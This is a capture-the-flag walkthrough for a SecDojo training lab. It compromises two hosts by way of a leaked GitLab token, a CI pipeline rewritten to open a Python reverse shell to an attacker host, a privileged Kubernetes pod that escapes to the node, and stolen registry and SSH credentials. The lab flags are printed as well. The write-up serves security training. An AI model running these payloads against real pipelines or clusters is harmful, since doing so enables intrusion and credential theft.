# Nigeria SecDojo Lab Walkthrough

This document details the step-by-step exploitation of the Nigeria Lab (Olgo and Ebari) to capture both root flags, including the specific payloads used.

## 1. Reconnaissance
**Finding**: Two targets identified via Nmap.
- **Olgo (10.8.0.2)**: SSH, HTTP, Kubernetes Node.
- **Ebari (10.8.0.3)**: GitLab (v18.2.1), Workspaces (9000).

## 2. Olgo (10.8.0.2) Root Flag

### Step 1: Token Leak Discovery
**Payload**: Investigating commit history in `root/devops-tools`.
```bash
# Found in commit logs (redacted in later commits)
glpat-HK-PNgj7PrsxxGba-jez
```

### Step 2: GitLab Pipeline Poisoning (Reverse Shell)
**Action**: Update `.gitlab-ci.yml` in `root/k8s-deployments` to execute a reverse shell on the runner.
**Payload (`evil-ci.yml`)**:
```yaml
deploy_to_k8s:
  stage: deploy
  image: bitnami/kubectl:latest
  script:
    - export RHOST="10.8.0.4"; export RPORT="9001"; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
  only:
    - main
```

### Step 3: Kubernetes Privilege Escalation (Container Escape)
**Action**: Use the extracted `KUBE_CONFIG` from the runner to launch a privileged pod with host access.
**Payload ([kubeconfig.yaml](file:///home/rad/Desktop/secdojo/kubeconfig.yaml))**:
*(Extracted from CI environment variable `KUBE_CONFIG`)*

**Payload (`pwn-root.yaml`)**:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn-root-3
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: bitnami/kubectl:latest
    command: [ "nsenter", "-t", "1", "-m", "-u", "-n", "-i", "--", "bash" ]
    securityContext:
      privileged: true
      runAsUser: 0
    volumeMounts:
    - name: host
      mountPath: /hostroot
  volumes:
  - name: host
    hostPath:
      path: /
```
**Command**: `kubectl apply -f pwn-root.yaml`
**Result**: Root shell on Olgo via `kubectl exec -it pwn-root-3 -- bash`.

### Flag Capture (Olgo)
**Command**: `cat /hostroot/root/proof.txt`
**Value**: `Okpo_group_38614-dts87ge285seogtcwnp2ehd5k5veazkz`

---

## 3. Ebari (10.8.0.3) Root Flag

### Step 1: Credential Extraction from Kubernetes
**Action**: Dump secrets from the `ci-build` namespace to find registry credentials.
**Command**:
```bash
kubectl -n ci-build get secret gitlab-registry-secret -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
```
**Result**:
```json
{"auths":{"https://gitlab.pipepoison.local":{"username":"x-registry-bot","password":"glpat-Jxo8jYxLpasGm4AtjvqD"}}}
```

### Step 2: Hidden Repository Discovery
**Action**: Use the `x-registry-bot` extracted PAT to enumerate projects visible to it.
**Command**:
```bash
curl -k -H "PRIVATE-TOKEN: glpat-Jxo8jYxLpasGm4AtjvqD" "https://10.8.0.3/api/v4/projects?membership=true"
```
**Result**: Identified `root/gitlab-bootstrap` (ID 4).

### Step 3: SSH Key Extraction
**Action**: Read the `playbooks/gitlab.yml` file from the hidden repo.
**Command**:
```bash
curl -k -H "PRIVATE-TOKEN: glpat-Jxo8jYxLpasGm4AtjvqD" "https://10.8.0.3/api/v4/projects/4/repository/files/playbooks%2Fgitlab.yml/raw?ref=master"
```
**Payload Found**:
```yaml
vars:
  ssh_private_key: |
    -----BEGIN OPENSSH PRIVATE KEY-----
    ...
    -----END OPENSSH PRIVATE KEY-----
```

### Step 4: Root Access & Flag Capture
**Action**: Save key and SSH into Ebari.
**Command**:
```bash
chmod 600 root_key
ssh -i root_key root@10.8.0.3
cat /root/proof.txt
```
**Value**: `Eberi_group_38614-hhuksfuuar82lpo2gtc53irmazolxc1v`

---

## Summary of Flags
| Machine | Flag Type | Value |
| :--- | :--- | :--- |
| **Olgo (10.8.0.2)** | Root | `Okpo_group_38614-dts87ge285seogtcwnp2ehd5k5veazkz` |
| **Ebari (10.8.0.3)** | Root | `Eberi_group_38614-hhuksfuuar82lpo2gtc53irmazolxc1v` |
